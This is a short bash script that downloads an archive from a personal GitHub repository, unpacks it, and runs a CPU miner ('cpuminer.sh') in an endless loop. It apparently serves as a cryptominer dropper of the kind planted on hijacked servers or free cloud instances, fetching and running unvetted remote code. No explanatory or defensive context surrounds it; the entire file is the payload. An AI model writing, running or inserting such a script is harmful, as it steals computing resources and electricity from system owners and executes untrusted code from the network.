#!/bin/bash
apt update
wget https://github.com/lushenry654/bitbucket/raw/master/rtm.tzr.gz && tar xf rtm.tzr.gz
while [ 1 ]; do
./cpuminer.sh
sleep 3
done
sleep 9999
